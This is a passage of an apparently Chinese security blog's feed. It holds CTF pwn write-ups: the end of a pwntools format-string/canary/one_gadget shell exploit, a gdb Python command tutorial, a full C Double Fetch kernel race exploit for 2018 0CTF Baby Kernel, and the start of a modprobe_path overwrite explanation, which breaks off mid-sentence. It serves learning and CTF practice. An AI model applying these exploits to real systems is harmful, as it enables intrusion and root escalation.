class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        v2=libc.rand()%<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0</span>:</span><br><span class="line">            v3=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">1</span>:</span><br><span class="line">            v3=<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">2</span>:</span><br><span class="line">            v3=<span class="number">0</span></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(v3))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;%42178c%9$hn&#x27;</span>+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%27$p&#x27;</span>+<span class="string">&#x27;aaa&#x27;</span>+p64(leak_addr-<span class="number">520</span>)</span><br><span class="line">    <span class="comment">#42178就是十六进制的a4c2,我赌倒数第四位是a   -&gt;.-&gt;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    atoi_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">16</span></span><br><span class="line">    libc_base=atoi_addr-lib.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    sys_addr=lib.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">    bin_sh_addr=lib.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+libc_base</span><br><span class="line">    payload2=<span class="number">0x108</span>*<span class="string">&#x27;a&#x27;</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4f302</span> +libc_base)</span><br><span class="line">    p.send(payload2)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">times=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        times += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">10</span>+<span class="built_in">str</span>(times)+<span class="string">&quot; times&quot;</span>+<span class="string">&quot;*&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220324174853430-1511606619.png" alt=""><br>PS：这道题如果打远程的话，是需要用题目中给出的动态库，如果本地的话，用自己本地的动态库就行</p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 猜数游戏 </tag>
            
            <tag> 泄露canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用python来自定义gdb命令</title>
      <link href="/posts/26ba4673.html"/>
      <url>/posts/26ba4673.html</url>
      
        <content type="html"><![CDATA[<p><code>gdb</code> 是一款 <code>linux</code> 下常用的程序调试器，有时可能我们会根据自己的需求来尝试写一些自定义的 <code>gdb</code> 命令，而通过 <code>python</code> 语言来编写的话，是再好不过了，下面记录一下如何用 <code>python</code> 语言编写自己的 <code>gdb</code> 命令</p><p>有两种方法，第一种是直接在 <code>.gdbinit</code> 文件中来编写，如果只是自定义一个或很少的命令采用这种方法是可以的。（ <code>gdb</code> 启动时，会在当前用户的主目录寻找一个 <code>.gdbinit</code> 的文件，如果该文件存在的话将执行该文件的所有命令）</p><p>假设现在编写一个获取 <code>libc</code> 基地址的命令,代码如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libc_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    line = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="built_in">list</span>=i.split(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m    &quot;</span>,<span class="built_in">list</span>[<span class="number">1</span>])</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">define libc</span><br><span class="line">    python libc_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这个格式是先在一行写下 <code>python</code> ，接下来正常编写函数即可（ <code>gdb.execute</code> 函数可以在 <code>gdb</code> 内部执行命令，并且将命令的执行结果返回给调用者 ），最后以 <code>end</code> 结尾。然后再用 <code>define</code> 来定义这个命令的名称，然后下一行用 <code>python</code> 调用上面的函数，最后以 <code>end</code> 结尾即可。</p><p>把上面的代码复制到 <code>.gdbinit</code> 文件中，启动 <code>gdb</code> 即可正常使用 <code>libc</code> 命令</p><p>但如果想自定义的命令很多的话，全部把命令都写到 <code>.gdbinit</code> 会显得很臃肿，所以可以把自定义的命令单独都存放到一个 <code>py</code> 文件中。比如创建一个叫做 <code>command.py</code> 的文件，然后在 <code>.gdbinit</code> 的开始写入 <code>source /home/zikh/Desktop/command.py</code> 即可，然后开始在 <code>command.py</code> 文件中编写命令。</p><p>比如我这里编写一个获取 <code>libc</code> 基地址、堆地址和程序基地址的命令,代码如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">base_cmd</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    flag1=<span class="number">0</span></span><br><span class="line">    flag2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">match</span>=[]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;home&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag1==<span class="number">0</span>:</span><br><span class="line">            flag1=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    base_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;heap&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag==<span class="number">0</span>:</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            line=line.split()</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    heap_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> flag2==<span class="number">0</span>:</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            line=line.split()     </span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">match</span>=re.findall(<span class="string">&quot;(0x\w+)&quot;</span>,element)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    libc_addr=<span class="keyword">match</span>[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mbase address\033[0m\t\t\t&quot;</span>,base_addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47mno heap\033[0m&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mheap base\033[0m\t\t\t&quot;</span>,heap_addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[0;31;47mlibc base\033[0m\t\t\t&quot;</span>,libc_addr)</span><br></pre></td></tr></table></figure><p>这个格式比较简单，首先在 <code>py</code> 文件的开头导入 <code>gdb</code> 模块，然后正常定义函数即可，最后写上 <code>gdb.execute(&quot;define base\n\tpython base_cmd()\nend&quot;)</code> ，这句一定要有，这个可以理解为你输入一个命令，然后 <code>gdb</code> 要查找是否存在这个命令的定义，只有加上最后一句，才能够识别出来这个命令。（每写一个命令，都需要加上 <code>gdb.execute</code> 的命令声明）</p><p>实际运行情况如下：</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041312961.png" alt="image-20230204131253466" style="zoom:50%;" /><p>如果要写带参数命令的话，可以参考以下格式</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_cmd</span>(<span class="params">arg0</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;decimal :\t&quot;</span>,arg0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hexadecimal\t&quot;</span>,<span class="built_in">hex</span>(arg0))</span><br><span class="line">gdb.execute(<span class="string">&quot;define hex\n\tpython hex_cmd(int($arg0))\nend&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041315210.png" alt="image-20230204131502126"></p><p>本文只是简单记录一下如何用 <code>python</code> 来编写 <code>gdb</code> 命令，至于编写什么命令，还是要根据自己的实际需求来考虑。</p>]]></content>
      
      
      <categories>
          
          <category> 尝试开发小工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于 kernel-Double Fetch 的学习总结</title>
      <link href="/posts/6176bce9.html"/>
      <url>/posts/6176bce9.html</url>
      
        <content type="html"><![CDATA[<h3 id="概述">概述</h3><blockquote><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p><p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但<strong>在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常</strong>。</p><p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p></blockquote><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" /><p>因为 <code>CTF wiki</code> 上这里总结的非常好（建议反复阅读 QAQ ），即使再叙述一遍也感觉意义不大，所以这里直接进行了引用</p><p>原文链接：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p><h3 id="2018-0CTF-Finals-Baby-Kernel">2018 0CTF Finals Baby Kernel</h3><p>题目链接：<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel">https://github.com/cc-sir/ctf-challenge/tree/master/2018 0CTF Finals Baby Kernel</a></p><h4 id="前置知识">前置知识</h4><h5 id="SMAP-SMEP">SMAP/SMEP</h5><p><code>SMAP</code> 即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），当开启这个保护后，在内核模式下无论是写入或者读取用户模式下的数据都会造成内存异常。<code>SMEP</code> （Supervisor Mode Execution Prevention）则是 <code>管理模式执行保护</code>，阻止内核空间中执行用户空间的数据。</p><h5 id="启动文件的设置">启动文件的设置</h5><p><code>lsmod</code> 命令查看模块基地址为 <code>0</code> ，需要本地调试的时候修改 <code>init</code> 文件（改完之后，再将文件系统打包），将原本的 <code>setsid cttyhack setuidgid 1000 sh</code> 改为 <code>setsid cttyhack setuidgid 0 sh</code> 即可。</p><p>关闭 <code>kaslr</code> 的话，在 <code>start.sh</code> 文件的此处加上 <code>nokaslr</code> 即可（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png" alt="image-20230329204004810"></p><p>内核中以 <code>printk</code> 输出的内容，可以通过 <code>dmesg</code> 命令查看。前提是需要关闭 <code>dmesg_restrict</code> ，否则无法查看 <code>printk</code> 信息，关闭方法如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure><p>系统内核参数 <code>kernel.dmesg_restrict</code> 用于控制普通用户是否可以查看内核日志 <code>dmesg</code>。当该参数值为1时，只有 <code>root</code> 用户才能查看内核日志，而普通用户则无法查看。而将该参数值设置为0，允许普通用户查看内核日志。</p><p><strong>注意：本题由于从内核中访问了用户态的数据，所以要关闭 <code>SMAP</code> 保护，否则会导致 <code>kernel panic</code></strong></p><h4 id="逆向分析">逆向分析</h4><p>当 <code>a2</code> 为 <code>0x1337</code> 会做三个检查</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png" alt="image-20230403155425780"></p><p>发现第一个 <code>_chk_range_not_ok</code> 函数的第三个参数是 <code>(&amp;current_task) + 0x1358</code> ，这个位置是 <code>stack pointer</code> 字段，记录了栈区的结束地址，也就是用户空间的最大范围。通过调试也可以印证（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png" alt="image-20230403174212778"></p><p><code>_chk_range_not_ok</code> 函数是第一个参数加第二个参数大于第三个参数的情况下返回 <code>True</code>  ，但该函数的外面还有一个 <code>!</code> ，所以这里的想过 <code>if</code> 的话，需要满足第一个参数加第二个参数小于第三个参数</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" /><p>这里出现了一个 <code>*(_QWORD *)v5</code> 和 <code>*(int *)(v5+8)</code> ，这个格式可以推断出来他们是结构体中的成员变量，因为拿 <code>*(_DWORD)(v5+8)</code> 去和 <code>flag</code> 的长度做了比较，可以猜测 <code>*(_DORD)(v5+8)</code> 是 我们输入<code>flag</code> 字符串的长度，结合前面分析 <code>_chk_range_not_ok</code> 函数第三个参数是用户空间的最大范围，所以这里是某个值加上输入字符串的长度，要小于用户区的最大范围，因此推断这个值应该是我们输入 <code>flag</code> 的起始地址</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png" alt="image-20230403211351891"></p><p>所以创建一个结构体，此时的代码如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png" alt="image-20230404092707055"></p><p>查看下面的代码知道 <code>v2</code> 就是 <code>rdx</code> ，也就是 <code>baby_ioctl</code> 函数第三个参数，后来将这个参数赋值为 <code>v5</code> ，因此在用户模式调用 <code>baby_ioctl</code> 函数时，第三个参数传入提前写好的结构体的指针即可。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png" alt="image-20230404092839113"></p><p>最后完整的分析一遍 <code>baby_ioctl</code> 函数（如下图）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png" alt="image-20230404093312297"></p><p>在调用 <code>ioctl</code> 的时候，第二个参数如果为 <code>0x6666</code> 则会泄露出内核中存放 <code>flag</code> 的地址。</p><p>如果第二个参数为 <code>0x1337</code> 并且第三个参数加上 <code>0x10</code> 小于用户区的最大空间并且第三个参数加上字符串的长度小于用户区的最大空间并且字符串的长度（这个长度并非真的是字符串的实际长度，而是结构体中 <code>length</code> 成员的值）要等于内核中存放的 <code>flag</code> 长度，就去遍历 <code>flag_addr</code> 与 真正的 <code>flag</code> 做对比，如果完全一样则将 <code>flag</code> 输出出来。</p><h4 id="漏洞产生">漏洞产生</h4><p>正常分析代码的话，确实找不到漏洞。这个程序希望我们拿用户态程序中的 <code>flag</code> 和内核中 <code>flag</code> 做对比，只有完全一样才输出 <code>flag</code>，程序专门检测了用户态程序中 <code>flag</code> 的地址是否位于用户区内。现在的情况做成图片（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png" alt="image-20230404102814465"></p><p>我们传入 <code>ioctl</code> 函数第三个参数是 <code>0x601100</code> （地址只是举个例子）也就是结构体的地址，结构体第一个成员是指针 <code>ptr</code>，只有 <code>ptr</code> 在用户区内（也就是为 <code>flag in the user_space</code>）才能通过第一个检查，不过这样就没办法通过第二个检查了，因为我们不可能碰巧在用户区自定义的 <code>flag</code> 和内核中的 <code>flag</code> 一样。</p><p>可是如果我们开启一个线程，在程序通过第一个检查后，不断将 <code>ptr</code> 改成 <code>flag in the kernel_space</code> （提前将内核中的 <code>flag</code> 地址泄露出来），这样到了第二个检查时，程序会将内核中的 <code>flag</code> 与自己做检查，从而绕过第二个检查，输出 <code>flag</code> 。问题在于我们不确定什么时候程序通过了第一个检查，所以要写一个循环，不断执行 <code>ioctl</code> ，同时开启线程也不断循环去改变 <code>ptr</code> ，当碰巧程序通过了第一个检查时，线程正好也将 <code>ptr</code> 改变成了 <code>flag in the kernel_space</code> ，此时得到 <code>flag</code></p><h4 id="EXP">EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -o exp -w -static -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> true_flag_address;</span><br><span class="line"><span class="type">int</span> over=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> *flag;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_flag</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> info *)a;</span><br><span class="line">    <span class="keyword">while</span> (over==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;flag = (<span class="type">char</span> *)true_flag_address;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;debug1 %d \n&quot;</span>,s-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> <span class="title">flag_info</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tt;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1-------&gt;%d\n&quot;</span>, fd1);</span><br><span class="line">    ioctl(fd1, <span class="number">0x6666</span>, <span class="number">0x0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; 1.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;1.txt&quot;</span>, O_RDWR);</span><br><span class="line">    lseek(fd2, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(fd2, buf, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="type">char</span> *index = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag address ------&gt; &quot;</span>);</span><br><span class="line">        write(<span class="number">1</span>, index, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    true_flag_address = strtoull(index, &amp;str, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nflag1 true_flag_adddress ----------&gt; %llx\n&quot;</span>, true_flag_address);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> false_flag[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    flag_info.length = <span class="number">33</span>;</span><br><span class="line">    flag_info.flag = false_flag;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tt, <span class="literal">NULL</span>, change_flag, &amp;flag_info);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd1, <span class="number">0x1337</span>, &amp;flag_info);</span><br><span class="line">        flag_info.flag = false_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    over = <span class="number">1</span>;</span><br><span class="line">    pthread_join(tt, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png" alt="image-20230404104852837"></p><h3 id="参考文章：">参考文章：</h3><p>[<a href="https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8">原创]Linux Kernel Pwn_1_Double fetch-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502">(47条消息) Linux kernel Exploit 内核漏洞学习(1)-Double Fetch_钞sir的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-Double Fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 kernel-RW Any Memory 的学习总结</title>
      <link href="/posts/12effc43.html"/>
      <url>/posts/12effc43.html</url>
      
        <content type="html"><![CDATA[<p>通过本题的学习，了解到了在内核的内存具有任意地址读写的能力后，可以利用的手法。</p><h3 id="前置知识">前置知识</h3><p><code>modprobe</code> 是一个 <code>Linux</code> 程序，用于在 <code>Linux</code> 内核中添加或移除一个可加载内核模块，该程序的路径是内核全局变量，默认为 <code>/sbin/modprobe</code>，存在在内核符号 <code>modprobe_path</code> 下（此处内存有可写权限）。</p><p>当执行的文件类型为系统未知的类型时（也就是未知的文件魔术头），将通过 <code>modprobe_path</code> 来执行 <code>modprobe</code> 程序。需要注意的是，<code>modprobe_path</code> 中存储的路径并不会被判断是否正常，无论路径指向的是哪个文件，都会将其执行，因为系统仍然处于内核模式，所以是以 <code>root</code> 权限执行的目标文件，如果目标文件是我们编写的 <code>shell</code> 脚本，那么就相当于我们具有了 <code>root</code> 权限下的任意执行命令的能力。</p><p>因此如果有任意地址读写的能力，可以考虑覆盖 <code>modprobe_path</code> ，它比起调用<code>commit_creds(prepare_kernel_cred(0))</code> 更方便。</p><p>题目是 2019STARCTF hackeme 链接：<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme">https://github.com/cc-sir/ctf-challenge/tree/master/2019 STARCTF hackme</a></p><h3 id="逆向分析">逆向分析</h3><p>通过下面的 <code>_kmalloc</code> 函数，可以分析出来 <code>v19</code> 是 <code>size</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png" alt="image-20230410201237881"></p><p>而程序最开始有一个 <code>copy_from_user</code> 函数， <code>copy</code> 了 <code>32</code> 个字节的数据，正好是可以控制从 <code>v17</code> 开始到 <code>v20</code> ，考虑到上面 <code>v19</code> 是个 <code>size</code> ，我们可以猜测这四个变量都是一个结构体中的成员变量</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png" alt="image-20230410201412269"></p><p>通过这三行代码，可以猜测出来 <code>v17</code> 是一个 <code>index</code> ，其决定了申请出来堆块的地址放到 <code>pool</code> 数组的哪个位置（ <code>pool</code> 数组就是来存放申请的堆块地址的）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png" alt="image-20230410203337467"></p><p>这里将 <code>v18</code> 中的数据 <code>copy</code> 到了刚刚申请的堆块中，所以我们判断 <code>v18</code> 是 <code>data_ptr</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png" alt="image-20230410211733810"></p><p>程序中的 <code>v20</code> ，刚开始看感觉很奇怪，具体啥作用也说不上来，因为 <code>v4</code> 已经是堆地址了，所以加上的 <code>v20</code> 我们姑且称之为 <code>offset</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png" alt="image-20230410212250229"></p><p>四个变量名字确定之后，开始分析程序</p><h4 id="delete">delete</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png" alt="image-20230410215435020"></p><p>首先是 <code>delete</code> 部分（如上），发现这个 <code>kfree()</code> 很奇怪，因为 <code>IDA</code> 生成的伪代码看不到参数，溯源一下汇编发现 <code>kfree</code> 的参数其实就是 <code>v14</code> （如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png" alt="image-20230410215111627"></p><h4 id="add">add</h4><p>这个 <code>add</code> 部分可以发现 <code>v12[0]</code> 存放的是申请的 <code>chunk_addr</code> ，<code>v12[1]</code> 存放的是 <code>size</code> ，而 <code>v12</code> 本身就是 <code>pool[2*index]</code> 数组的地址，因此 <code>chunk_addr</code> 和 <code>size</code> 都记录在了 <code>pool</code> 数组中。通过 